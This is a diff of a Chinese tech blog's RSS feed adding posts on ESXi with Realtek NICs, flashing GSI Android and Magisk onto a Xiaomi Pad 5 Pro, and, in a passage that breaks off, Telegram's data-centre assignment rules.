@@ -13,24 +13,680 @@
 <channel>
 	<title>Coxxs</title>
 	<atom:link href="https://dev.moe/feed" rel="self" type="application/rss+xml" />
-	<link>https://dev.moe</link>
+	<link>https://dev.moe/</link>
 	<description></description>
-	<lastBuildDate>Wed, 05 Jan 2022 12:31:42 +0000</lastBuildDate>
+	<lastBuildDate>Thu, 18 Aug 2022 23:29:56 +0000</lastBuildDate>
 	<language>zh-CN</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
 	<sy:updateFrequency>
 	1	</sy:updateFrequency>
-	<generator>https://wordpress.org/?v=5.8.3</generator>
+	<generator>https://wordpress.org/?v=6.0.2</generator>
 
 <image>
 	<url>https://dev.moe/wp-content/uploads/2015/11/cropped-0e9d3ee98a13c72bf9e698bd46214bb7-32x32.png</url>
 	<title>Coxxs</title>
-	<link>https://dev.moe</link>
+	<link>https://dev.moe/</link>
 	<width>32</width>
 	<height>32</height>
 </image> 
 <site xmlns="com-wordpress:feed-additions:1">66418562</site>	<item>
+		<title>ESXi 7.0 + R8168 / R8169 安装笔记</title>
+		<link>https://dev.moe/2794</link>
+					<comments>https://dev.moe/2794#respond</comments>
+		
+		<dc:creator><![CDATA[Coxxs]]></dc:creator>
+		<pubDate>Thu, 18 Aug 2022 23:10:59 +0000</pubDate>
+				<category><![CDATA[Random]]></category>
+		<guid isPermaLink="false">https://dev.moe/?p=2794</guid>
+
+					<description><![CDATA[<p>在一台不受支持的设备上安装 ESXi 是一件很考验运气的事。运气不好的我就发现电脑自带的网卡是 Realtek<a class="more-link" href="https://dev.moe/2794">继续阅读<span class="screen-reader-text">"ESXi 7.0 + R8168 / R8169 安装笔记"</span></a></p>
+<p><a rel="nofollow" href="https://dev.moe/2794">ESXi 7.0 + R8168 / R8169 安装笔记</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></description>
+										<content:encoded><![CDATA[
+<p>在一台不受支持的设备上安装 ESXi 是一件很考验运气的事。运气不好的我就发现电脑自带的网卡是 Realtek R8168 —— 一张 ESXi 不再支持的网卡。</p>
+
+
+
+<p>在 ESXi 6.x 时代，我们可以添加 net55-r8168 驱动让 ESXi 支持这张网卡，但 ESXi 7.x 禁用所有依赖 Linux 的驱动后，这个方法就行不通了。</p>
+
+
+
+<span id="more-2794"></span>
+
+
+
+<h2>USB Network Native Driver for ESXi</h2>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full is-resized"><a href="https://dev.moe/wp-content/uploads/2022/08/image.png"><img src="https://dev.moe/wp-content/uploads/2022/08/image.png" alt="" class="wp-image-2795" width="279" height="167" srcset="https://dev.moe/wp-content/uploads/2022/08/image.png 827w, https://dev.moe/wp-content/uploads/2022/08/image-300x180.png 300w, https://dev.moe/wp-content/uploads/2022/08/image-768x462.png 768w" sizes="(max-width: 279px) 100vw, 279px" /></a><figcaption>USB NIC</figcaption></figure></div>
+
+
+<p>幸运的是，ESXi 现在提供了几款热门 USB 网卡的原生驱动（ASIX88179, RTL8152/RTL8153, AQC111U）。我们可以购买一个支持的 USB NIC 适配器，然后制作包含 <a href="https://flings.vmware.com/usb-network-native-driver-for-esxi" target="_blank" rel="noreferrer noopener">VMKUSB-NIC-FLING</a> 驱动的镜像来安装 ESXi。</p>
+
+
+
+<p>安装流程可以参考 <a href="https://www.virten.net/2020/09/tips-for-using-usb-network-adapters-with-vmware-esxi/" target="_blank" rel="noreferrer noopener">Tips for using USB Network Adapters with VMware ESXi</a>。</p>
+
+
+
+<p>安装后，如果每次开机后都要重新勾选网卡才能联网，则需要参考<a href="https://flings.vmware.com/usb-network-native-driver-for-esxi#instructions" target="_blank" rel="noreferrer noopener">这里</a>，添加开机脚本，使系统自动识别 USB 网卡：</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group=""># /etc/rc.local.d/local.sh
+
+vusb0_status=$(esxcli network nic get -n vusb0 | grep 'Link Status' | awk '{print $NF}')
+count=0
+while [[ $count -lt 20 &amp;&amp; "${vusb0_status}" != "Up" ]]
+do
+    sleep 10
+    count=$(( $count + 1 ))
+    vusb0_status=$(esxcli network nic get -n vusb0 | grep 'Link Status' | awk '{print $NF}')
+done
+
+esxcfg-vswitch -R</pre>
+
+
+
+<h2>R8168 Passthrough</h2>
+
+
+
+<p>为了不浪费原先 R8168 网卡的网口，同时提升性能（USB 网卡会影响性能），我们可以将 R8168 网卡直通（Passthrough）到 ESXi 中的某一台虚拟机中继续使用。</p>
+
+
+
+<p>然而实际配置好后，这张破网卡又开始出问题了——每隔几分钟就会断一次网。此时在虚拟机的 <code>/var/log/kern.log</code> 可以看到如下错误：</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">ubuntu kernel: [ 2581.050902] ------------[ cut here ]------------
+ubuntu kernel: [ 2581.050905] NETDEV WATCHDOG: ens100 (r8169): transmit queue 0 timed out
+ubuntu kernel: [ 2581.050921] WARNING: CPU: 0 PID: 0 at net/sched/sch_generic.c:472 dev_watchdog+0x270/0x280</pre>
+
+
+
+<p>搜索后<a href="https://askubuntu.com/questions/1405788/ubuntu-22-04-on-ideapad-l340-15irh-gaming-wired-networking-not-working" target="_blank" rel="noreferrer noopener">发现</a>可能是 Linux 自带的驱动有问题。我们可以安装 Realtek 提供的驱动尝试解决。在 Ubuntu 下使用 apt 命令即可直接安装：</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">apt install r8168-dkms</pre>
+
+
+
+<p>重启后问题解决。</p>
+
+
+
+<p><strong>Coxxs</strong></p>
+<p><a rel="nofollow" href="https://dev.moe/2794">ESXi 7.0 + R8168 / R8169 安装笔记</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://dev.moe/2794/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">2794</post-id>	</item>
+		<item>
+		<title>小米平板 5 Pro 刷入 GSI Android 教程</title>
+		<link>https://dev.moe/2716</link>
+					<comments>https://dev.moe/2716#comments</comments>
+		
+		<dc:creator><![CDATA[Coxxs]]></dc:creator>
+		<pubDate>Sat, 11 Jun 2022 06:08:22 +0000</pubDate>
+				<category><![CDATA[Random]]></category>
+		<guid isPermaLink="false">https://dev.moe/?p=2716</guid>
+
+					<description><![CDATA[<p>到手了一块小米平板 5 Pro，又一次刷新了我对小米的认知。开个开发者模式要倒数 10 秒看警告；装个 apk<a class="more-link" href="https://dev.moe/2716">继续阅读<span class="screen-reader-text">"小米平板 5 Pro 刷入 GSI Android 教程"</span></a></p>
+<p><a rel="nofollow" href="https://dev.moe/2716">小米平板 5 Pro 刷入 GSI Android 教程</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></description>
+										<content:encoded><![CDATA[
+<p>到手了一块小米平板 5 Pro，又一次刷新了我对小米的认知。开个开发者模式要倒数 10 秒看警告；装个 apk 也要倒数 10 秒看警告；解锁 Bootloader 又是登录账号，又是联网绑定，还要等 168 个小时，把用户当贼一样防。</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2022/06/image.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2022/06/image-1024x698.png" alt="" class="wp-image-2722" width="444" height="302" srcset="https://dev.moe/wp-content/uploads/2022/06/image-1024x698.png 1024w, https://dev.moe/wp-content/uploads/2022/06/image-300x204.png 300w, https://dev.moe/wp-content/uploads/2022/06/image-768x523.png 768w, https://dev.moe/wp-content/uploads/2022/06/image.png 1055w" sizes="(max-width: 444px) 100vw, 444px" /></a><figcaption>听我说谢谢你，因为有你，温暖了四季&#8230;</figcaption></figure></div>
+
+
+<p>更难受的是，小米平板 5 Pro 并未在全球发售，唯一支持的 MIUI 国行系统自带<strong>全链路反诈</strong>。隔壁低配的小米平板 5 反倒是又有国际版 MIUI，又有 Android 13 DP（开发者预览）。</p>
+
+
+
+<p>不过，小米平板 5 系列通过了 <a href="https://www.android.com/certified/" target="_blank" rel="noreferrer noopener">Android 认证</a>。这意味着即使没人给它适配第三方系统，它也一定能跑 Google 发布的 GSI（Generic System Images）原生系统。 而又有许多适配 GSI 的第三方系统，这就解锁了无限可能。</p>
+
+
+
+<span id="more-2716"></span>
+
+
+
+<p>如果有一定的刷机经验，刷写 GSI 非常简单，本文也部分适用于其他 Android 设备。</p>
+
+
+
+<p><strong>免责声明：本文为经验总结，操作前请先备份，操作风险自负。</strong></p>
+
+
+
+<h2>解锁 Bootloader</h2>
+
+
+
+<p><a href="https://developer.android.com/studio/releases/platform-tools.html" target="_blank" rel="noreferrer noopener">下载 SDK Platform Tools</a>（包括 adb、fastboot 等实用程序）</p>
+
+
+
+<p><a href="https://www.miui.com/unlock/index.html" target="_blank" rel="noreferrer noopener">解锁程序</a>，解锁时会清除所有数据。</p>
+
+
+
+<ol><li>关机时按住 <code>音量减</code>&nbsp;+&nbsp;<code>电源键</code> 进入 Bootloader。</li><li>连接电脑，按解锁程序提示操作即可。如果程序提示要等 7 天，则 7 天后再次尝试。</li></ol>
+
+
+
+<p>接下来在刷入 GSI 前，可以先刷入 <a href="https://github.com/topjohnwu/Magisk/releases" target="_blank" rel="noreferrer noopener">Magisk</a>，便于之后的操作。</p>
+
+
+
+<h2>安装 Magisk（可选）</h2>
+
+
+
+<p>小米平板 5 Pro 目前没有能用的 Recovery，这里通过手动补丁的方式安装。</p>
+
+
+
+<ol><li>下载与平板系统相同版本的线刷包，提取其中的 <code>boot.img</code>，复制进平板。</li><li>进入系统安装 Magisk.apk，用 Magisk Manager 给 <code>boot.img</code> 手动补丁（Install -&gt; Select and Patch a File）。</li><li>将获得的&nbsp;<code>magisk_patched-XXX.img</code>&nbsp;传回电脑。</li><li>进入 Bootloader，连接电脑，输入&nbsp;<code>fastboot boot magisk_patched-XXX.img</code>&nbsp;临时进入支持 Magisk 的系统。<ul><li>如果未成功进入，可以重新进入 Bootloader 再试一次</li></ul></li><li>自动开机后，在 Magisk Manager 中正式安装 Magisk（Install -&gt; Direct Install）。</li></ol>
+
+
+
+<h2>备份 Persist 分区（可选）</h2>
+
+
+
+<p>Persist 分区中储存了诸如指纹模块等的校准信息，这些信息每部设备都是不同的，丢失无法恢复。建议在获取 root 权限后备份一份，以备不时之需。</p>
+
+
+
+<ol><li>进入 MIUI 系统，开启 USB 调试。</li><li>连接电脑，输入以下命令。</li></ol>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">adb shell
+su # 获取 root 权限，请在手机上确认
+dd if=/dev/block/bootdevice/by-name/persist of=/sdcard/persist.img
+# 此时按两次 Ctrl + D，退出 adb shell
+adb pull /sdcard/persist.img</pre>
+
+
+
+<p>将获得的 <code>persist.img</code> （大小约 64 MB）长期保存，避免丢失（本教程不会用到）。</p>
+
+
+
+<h2>刷入 GSI 镜像</h2>
+
+
+
+<p><a href="https://github.com/phhusson/treble_experimentations/wiki/Generic-System-Image-(GSI)-list" target="_blank" rel="noreferrer noopener">GSI 系统列表</a><br><a href="https://dl.google.com/developers/android/qt/images/gsi/vbmeta.img" target="_blank" rel="noreferrer noopener">vbmeta.img</a></p>
+
+
+
+<p>小米平板 5 Pro 是 <strong>AB 分区</strong>，<strong>ARM64</strong>。选择一个喜欢的 ROM 即可。我测试过可用的有：</p>
+
+
+
+<ul><li><a href="https://github.com/ponces/treble_build_pe/releases">Pixel Experience Plus</a><ul><li>带 Plus 的版本有一些额外功能，如网速显示</li><li>基于 Pixel 手机系统，颜值较高，但平板上用会有一些布局错位</li></ul></li><li><a href="https://sourceforge.net/projects/andyyan-gsi/files/lineage-19.x/" target="_blank" rel="noreferrer noopener">Lineage</a><ul><li>测试无法通过 SafetyNet</li><li>对平板适配较好</li></ul></li><li><a href="https://github.com/phhusson/treble_experimentations/releases/">AOSP (phhusson)</a><ul><li>上面的 ROM 都是基于 phhusson 大神的这个项目制作的</li></ul></li><li><a href="https://developer.android.com/about/versions/13/gsi-release-notes" target="_blank" rel="noreferrer noopener">Android 13 GSI</a><ul><li>蓝牙无法使用（Beta 3）</li></ul></li></ul>
+
+
+
+<ol><li>下载解压 ROM，获得 <code>system.img</code>。</li><li>进入 Bootloader，连接电脑。</li><li><code>fastboot flash --disable-verity --disable-verification vbmeta vbmeta.img</code><ul><li>此步骤用于停用 <a href="https://source.android.com/security/verifiedboot" target="_blank" rel="noreferrer noopener">Verified Boot</a> 分区验证，只需执行一次</li><li>如果已经安装了 Magisk，可以跳过本步骤，但未来要一直安装着 Magisk，否则 <code>system</code> 分区通不过校验可能会被禁用，需要重刷</li></ul></li><li><code>fastboot reboot fastboot</code><ul><li>此步骤用于进入 <a href="https://source.android.com/devices/bootloader/fastbootd" target="_blank" rel="noreferrer noopener">fastboot<strong>d</strong></a>，进入后屏幕上应显示 fastbootd</li></ul></li><li><code>fastboot flash system system.img</code>，等待刷写完毕</li><li><code>fastboot reboot recovery</code>，进入 Recovery 后，按提示操作清除数据并重启系统<ul><li>刷入不同类型 ROM 或版本降级时必须清除数据，否则无法进入系统</li></ul></li></ol>
+
+
+
+<p>此时应该已成功进入系统。如果此前安装了 Magisk，新系统中会自动出现 Magisk 应用。</p>
+
+
+
+<h2>功能补丁</h2>
+
+
+
+<p>由于 GSI 镜像并非针对小米平板 5 开发，有一些细节问题需要修复。</p>
+
+
+
+<h3>开启 120 Hz</h3>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">adb shell settings put system min_refresh_rate 120
+adb shell settings put system peak_refresh_rate 120</pre>
+
+
+
+<p>如果设置里有 Phh Treble Settings 的话，也可以在里面直接改（Misc features -&gt; Force FPS）。</p>
+
+
+
+<h3>修复音频</h3>
+
+
+
+<div class="wp-block-file"><a id="wp-block-file--media-cc13a9c9-1a03-4bb5-ab04-00f928bea80b" href="https://dev.moe/wp-content/uploads/2022/06/GSI-Audio-Stutter-Fix-Mi-Pad-5-Pro-elish.zip">GSI-Audio-Stutter-Fix（Magisk 模块）</a><a href="https://dev.moe/wp-content/uploads/2022/06/GSI-Audio-Stutter-Fix-Mi-Pad-5-Pro-elish.zip" class="wp-block-file__button wp-element-button" download aria-describedby="wp-block-file--media-cc13a9c9-1a03-4bb5-ab04-00f928bea80b">下载</a></div>
+
+
+
+<p>来源：<a href="https://forum.xda-developers.com/t/run-an-gsi-on-your-mi-pad-5.4352591/page-9#post-86447857" target="_blank" rel="noreferrer noopener">https://forum.xda-developers.com/t/run-an-gsi-on-your-mi-pad-5.4352591/page-9#post-86447857</a></p>
+
+
+
+<h3>移除屏幕锐化</h3>
+
+
+
+<div class="wp-block-file"><a id="wp-block-file--media-7b883aff-bcc4-4d2c-902c-04d63968e3ff" href="https://dev.moe/wp-content/uploads/2022/06/Remove-screen-sharpening-Mi-Pad-5-Pro.zip">Remove-screen-sharpening（Magisk 模块）</a><a href="https://dev.moe/wp-content/uploads/2022/06/Remove-screen-sharpening-Mi-Pad-5-Pro.zip" class="wp-block-file__button wp-element-button" download aria-describedby="wp-block-file--media-7b883aff-bcc4-4d2c-902c-04d63968e3ff">下载</a></div>
+
+
+
+<p>注意到屏幕会经常出现锐化的效果，看了下 MIUI 并不会有这种情况，费半天劲找到了引起问题的设置，写 Magisk 模块修复之。</p>
+
+
+
+<h3>修复任务栏</h3>
+
+
+
+<p><a href="https://github.com/Coxxs/hide-tablet-taskbar">hide-tablet-taskbar</a>（Magisk 模块）</p>
+
+
+
+<p>因为 Pixel 目前还没发布平板，所以 PixelExperience 系统对平板的支持有些小问题（比如任务栏只显示一半）。写了个 Magisk 模块修复之。另外似乎还没有模块支持隐藏 Android 12.1 平板模式下的底部提示条，这里也顺便支持了隐藏。</p>
+
+
+
+<p><s>本来想用 <a href="https://source.android.com/devices/architecture/rros" target="_blank" rel="noreferrer noopener">Resource Overlay</a> 的方式实现的，但不知为何不生效，只能用 Xposed 了。</s></p>
+
+
+
+<p>已经用 Overlay 实现了。</p>
+
+
+
+<h3>SafetyNet</h3>
+
+
+
+<p>SafetyNet 的修复根据不同 ROM 分成几种情况，这里简单分享下经验。</p>
+
+
+
+<p><strong>PixelExperience ROM</strong> 已经模拟了设备信息，只需在 Magisk DenyList 对 Play Services 隐藏即可。</p>
+
+
+
+<p><strong>Lineage OS</strong> 可能由于自带了 <code>su</code>，我没能成功通过 Basic integrity 测试（可能要自己修改 ROM 了）。</p>
+
+
+
+<p><strong>Android 13 GSI</strong> 需要 <a href="https://github.com/Magisk-Modules-Repo/MagiskHidePropsConf" target="_blank" rel="noreferrer noopener">MagiskHidePropsConf</a> + <a href="https://github.com/kdrag0n/safetynet-fix" target="_blank" rel="noreferrer noopener">Universal SafetyNet Fix</a> + Magisk DenyList，其中 MagiskHidePropsConf 设置成 MIUI 系统的 fingerprint，外加将 <code>ro.build.version.security_patch</code> 设置成 MIUI 系统对应版本的值（可以用 7z 打开线刷包的 <code>system.img</code>，在 <code>system/build.props</code> 里找到）。</p>
+
+
+
+<h4>Magisk DenyList 配置方法</h4>
+
+
+
+<ol><li>打开 Magisk，设置里选择 Hide the Magisk app</li><li>打开 Magisk，设置里启用 Zygisk 及 Enforce DenyList</li><li>进入 Configure DenyList，找到 Google Play services，只需勾选 <code>com.google.android.gms</code> 及 <code>com.google.android.gms.unstable</code> 两项。</li><li>进入设置，清除 Google Play services 及 Google Play Store 的数据。</li></ol>
+
+
+
+<h3>DRM</h3>
+
+
+
+<p>DRM 方面，Widevine 无需任何操作，神奇的保持在了 L1，修复 Safetynet 后即可直接观看 Disney+。</p>
+
+
+
+<p>Netflix 可能多了一套验证，默认会是 L3，以下操作后可以恢复到 L1：</p>
+
+
+
+<ol><li>确保 SafetyNet 已通过</li><li>将 Netflix 添加到 DenyList 列表</li><li>用 Magisk 模块在 <code>build.prop</code> 添加一行 <code>ro.netflix.bsp_rev=Q8250-19134-1</code><ul><li>该值仅适用于小米平板 5 Pro</li><li>Magisk 模块写法非常简单，可以参考上面的「移除屏幕锐化」模块</li><li>修改 <code>build.prop</code> 后需要清除 Netflix 应用数据重新登录</li><li>该修改<a href="https://github.com/phhusson/device_phh_treble/pull/313/files" target="_blank" rel="noreferrer noopener">已合并至上游</a>，一段时间后的新版 ROM 可能已经自带了</li><li>感谢几位朋友的帮助！</li></ul></li></ol>
+
+
+
+<h2>系统升级</h2>
+
+
+
+<p>由于小米平板 5 为 A/B 分区，之前刷机时只刷入了一个分区，另一个分区情况未知，直接升级有一定风险。</p>
+
+
+
+<p>建议<strong>非必要不升级</strong>。升级前务必备份好所有数据，升级后有可能无法开机，需要清数据重刷。</p>
+
+
+
+<p>如出现问题，可下载 MIUI 线刷包，使用 Mi Flash 线刷恢复至 MIUI 系统，再次刷入新版 GSI 系统。</p>
+
+
+
+<ul><li>如刷机刚开始时出现错误，不要试图修改刷机脚本绕过。请检查机型是否正确、是否触发防回滚检测。移除脚本中的自检代码强行刷入将会变砖，无法自行恢复。</li><li><strong>恢复时<span style="text-decoration: underline;">不建议</span>锁定 Bootloader</strong>（在 Mi Flash 底部选择）。</li><li>目前（2022-06）如将基于 Android 12 的 MIUI 13 作为底包，后续刷入 GSI 时，会出现一些兼容性问题。如果可能的话，建议刷入基于 Android 11 的 MIUI 13 稳定版。</li></ul>
+
+
+
+<hr class="wp-block-separator has-alpha-channel-opacity"/>
+
+
+
+<p>我最后使用的是 PixelExperience Plus，还是挺不错的，跑分能跑到正常水平，指纹也正常使用。蓝牙耳机在修复音频后可以正常使用（Android 13 Beta GSI 不兼容蓝牙）。因为 Pixel 还没发布平板，PE 自带的 Pixel Launcher 会有些 Bug，但原生 Android 又不是不能换桌面 :P。</p>
+
+
+
+<p>一些小问题是，小米键盘和手写笔会无法使用（没买这些），不支持双击唤醒（录入指纹后可用指纹快速唤醒），快充无法使用（被迫延长电池寿命），相机偶尔会假死，MIUI 的各种平板优化自然也没了。</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2022/06/Screenshot_20220611-Pixel-Launcher.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2022/06/Screenshot_20220611-Pixel-Launcher-1024x640.png" alt="" class="wp-image-2723" width="737" height="460" srcset="https://dev.moe/wp-content/uploads/2022/06/Screenshot_20220611-Pixel-Launcher-1024x640.png 1024w, https://dev.moe/wp-content/uploads/2022/06/Screenshot_20220611-Pixel-Launcher-300x188.png 300w, https://dev.moe/wp-content/uploads/2022/06/Screenshot_20220611-Pixel-Launcher-768x480.png 768w, https://dev.moe/wp-content/uploads/2022/06/Screenshot_20220611-Pixel-Launcher-1536x960.png 1536w, https://dev.moe/wp-content/uploads/2022/06/Screenshot_20220611-Pixel-Launcher-2048x1280.png 2048w, https://dev.moe/wp-content/uploads/2022/06/Screenshot_20220611-Pixel-Launcher-1568x980.png 1568w" sizes="(max-width: 737px) 100vw, 737px" /></a><figcaption>怕被叫成二次元，在 Pixel 壁纸库里换了张艺术壁纸！</figcaption></figure></div>
+
+
+<p>本文撰写过程中参考了以下内容，在此表示感谢：</p>
+
+
+
+<ul><li><a href="https://forum.xda-developers.com/t/run-an-gsi-on-your-mi-pad-5.4352591/" target="_blank" rel="noreferrer noopener">XDA</a></li></ul>
+
+
+
+<blockquote class="wp-block-quote"><p>本文（<a href="https://dev.moe/2716">https://dev.moe/2716</a>）由 Coxxs 原创，转载请注明原文链接。</p></blockquote>
+<p><a rel="nofollow" href="https://dev.moe/2716">小米平板 5 Pro 刷入 GSI Android 教程</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://dev.moe/2716/feed</wfw:commentRss>
+			<slash:comments>2</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">2716</post-id>	</item>
+		<item>
+		<title>Telegram DC 之都市传说</title>
+		<link>https://dev.moe/2564</link>
+					<comments>https://dev.moe/2564#comments</comments>
+		
+		<dc:creator><![CDATA[Coxxs]]></dc:creator>
+		<pubDate>Mon, 09 May 2022 20:33:12 +0000</pubDate>
+				<category><![CDATA[Random]]></category>
+		<guid isPermaLink="false">https://dev.moe/?p=2564</guid>
+
+					<description><![CDATA[<p>Telegram 号称有 5 个数据中心（DC, Data Center），在 Telegram 代码与文档中<a class="more-link" href="https://dev.moe/2564">继续阅读<span class="screen-reader-text">"Telegram DC 之都市传说"</span></a></p>
+<p><a rel="nofollow" href="https://dev.moe/2564">Telegram DC 之都市传说</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></description>
+										<content:encoded><![CDATA[
+<p>Telegram 号称有 5 个数据中心（DC, Data Center），在 Telegram 代码与文档中被称作 DC 1~5。其中 DC1 与 DC3 位于美国的迈阿密（Miami, USA）；DC2 与 DC4 位于荷兰的阿姆斯特丹（Amsterdam, NL）；DC5 位于新加坡（Singapore）。</p>
+
+
+
+<div class="wp-block-image size-large"><figure class="aligncenter is-resized"><a href="https://dev.moe/wp-content/uploads/2022/05/im.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2022/05/im-1024x709.png" alt="" class="wp-image-2676" width="627" height="434" srcset="https://dev.moe/wp-content/uploads/2022/05/im-1024x709.png 1024w, https://dev.moe/wp-content/uploads/2022/05/im-300x208.png 300w, https://dev.moe/wp-content/uploads/2022/05/im-768x532.png 768w, https://dev.moe/wp-content/uploads/2022/05/im.png 1238w" sizes="(max-width: 627px) 100vw, 627px" /></a><figcaption>Telegram 的<a href="https://status.gotd.dev/" target="_blank" rel="noreferrer noopener">运行状态</a></figcaption></figure></div>
+
+
+
+<p>每个帐号都会在注册时关联一个 DC，此后<strong>不随</strong>用户更改手机号或地理位置迁移。用户也不能自由选用 DC——如果连接到了错误的 DC，服务端会返回错误信息，要求客户端连接到帐号所关联的正确 DC 上。</p>
+
+
+
+<span id="more-2564"></span>
+
+
+
+<h2 id="从日常宕机的-dc5-说起">从日常宕机的 DC5 说起</h2>
+
+
+
+<p>在 5 个 DC 中，DC5 在 Telegram 中文圈格外知名——并不是因为它默默无闻服务了大量的中文用户，而是因为它经常宕机。</p>
+
+
+
+<p>当 DC5 宕机时，身处 DC5 的用户无法使用 Telegram，此时的 Telegram 圈内的话题往往会变成 「DC5 怎么又挂啦」。DC5 用户只能等待自己不断「重连中」的客户端恢复后，再与其他 DC 的群友们一起批判 DC5。</p>
+
+
+
+<div class="wp-block-image size-large"><figure class="aligncenter is-resized"><a href="https://dev.moe/wp-content/uploads/2022/05/image-1.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2022/05/image-1-1024x1006.png" alt="" class="wp-image-2567" width="574" height="564" srcset="https://dev.moe/wp-content/uploads/2022/05/image-1-1024x1006.png 1024w, https://dev.moe/wp-content/uploads/2022/05/image-1-300x295.png 300w, https://dev.moe/wp-content/uploads/2022/05/image-1-768x755.png 768w, https://dev.moe/wp-content/uploads/2022/05/image-1.png 1255w" sizes="(max-width: 574px) 100vw, 574px" /></a></figure></div>
+
+
+
+<h2 id="dc2-与-dc3-之谜">DC2 与 DC3 之谜</h2>
+
+
+
+<p>为了满足群友们的好奇心，有人写了个 bot（机器人），可以查询用户所处的 DC。于是群友们开始查起了自己的 DC：</p>
+
+
+
+<ul><li>用 +86 手机号注册的用户发现自己在 DC5（新加坡），即将体验下一次宕机。</li><li>用 +1 手机号注册的用户则会在 DC1（美国迈阿密），可以兼顾连接速度与稳定性。</li><li>用欧洲手机号注册的用户会发现自己在 DC4（荷兰阿姆斯特丹），成为了中文圈中最稀有的存在。</li></ul>
+
+
+
+<p>咦？等等&#8230; Telegram 不是号称有 5 个 DC 吗？那 DC2 与 DC3 呢？</p>
+
+
+
+<figure class="wp-block-image size-large"><a href="https://dev.moe/wp-content/uploads/2022/05/image.png"><img loading="lazy" width="1024" height="214" src="https://dev.moe/wp-content/uploads/2022/05/image-1024x214.png" alt="" class="wp-image-2566" srcset="https://dev.moe/wp-content/uploads/2022/05/image-1024x214.png 1024w, https://dev.moe/wp-content/uploads/2022/05/image-300x63.png 300w, https://dev.moe/wp-content/uploads/2022/05/image-768x160.png 768w, https://dev.moe/wp-content/uploads/2022/05/image-1536x321.png 1536w, https://dev.moe/wp-content/uploads/2022/05/image-2048x428.png 2048w, https://dev.moe/wp-content/uploads/2022/05/image-1568x328.png 1568w" sizes="(max-width: 1024px) 100vw, 1024px" /></a><figcaption>通过搜索 bot 的消息，用户位于 DC1 的有 360 条，DC4 有 50 条，DC5 有 390 条。DC2 与 DC3 有 0 条。</figcaption></figure>
+
+
+
+<p>通过搜索 bot 消息的「大数据查询」，我们发现似乎真的没有来自 DC2 与 DC3 的用户。</p>
+
+
+
+<p>于是，有人<a href="https://t.me/tgsucks/307">推测</a> DC2 与 DC3 皆无用户，也有人<a href="https://blog.hertz.zone/2021-11-07_TGDC" target="_blank" rel="noreferrer noopener">分析后推测</a> DC2 与 DC3 分别是 DC1 与 DC4 的附属 DC，会在其上级 DC 繁忙时接受用户注册。</p>
+
+
+
+<p>真的是这样吗？</p>
+
+
+
+<h2 id="telegram-dc-的分配规则-2022-05">Telegram DC 的分配规则（2022-05）</h2>
+
+
+
+<p>TL;DR：</p>
+
+
+
+<ul><li>DC1、DC2、DC4、DC5 是根据用户<strong>注册时</strong>所填写的手机号的<strong>国家代码</strong>分配的，这 4 个 DC 随时接受新用户注册，且均有大量存量用户。</li><li>DC3 曾经有用户，但在 2020 年左右，DC3 的存量用户<strong>可能已被转移至</strong> DC1。DC3 目前可能已无用户，且不再接受新用户注册。</li></ul>
+
+
+
+<p>也就是说，DC2 实际上关联着大量用户，且像其他 DC 一样，<strong>只要用户注册时，手机号的国家代码落在 DC2 负责的范围内（如 +49 德国），该用户就一定会进入 DC2</strong>。而 DC3 虽然仍在正常运行，但可能已无关联用户。</p>
+
+
+
+<p>既然有大量用户位于 DC2 ，为何上文的 bot 从未发现过来自 DC2 的用户呢？</p>
+
+
+
+<p>这是因为 bot 获取 DC 的方式出了问题。</p>
+
+
+
+<h2 id="我到底在哪个-dc">我到底在哪个 DC？</h2>
+
+
+
+<p>目前常用的 DC 获取方法有 3 种，下文将注册一个 DC2 的新帐号，实际尝试一下这 3 种方法。</p>
+
+
+
+<h3 id="方法-1-登录法">方法 1（登录法）</h3>
+
+
+
+<p>我们使用会被分配到 <strong>DC2</strong> 的手机号，通过 Telegram <a href="https://core.telegram.org/mtproto" target="_blank" rel="noreferrer noopener">MTProto 协议</a>（这也是官方客户端使用的协议）连接 <strong>DC1</strong>，调用 <a href="https://core.telegram.org/method/auth.sendcode" target="_blank" rel="noreferrer noopener">auth.sendCode</a> 接口，尝试发送验证码，注册一个账号。</p>
+
+
+
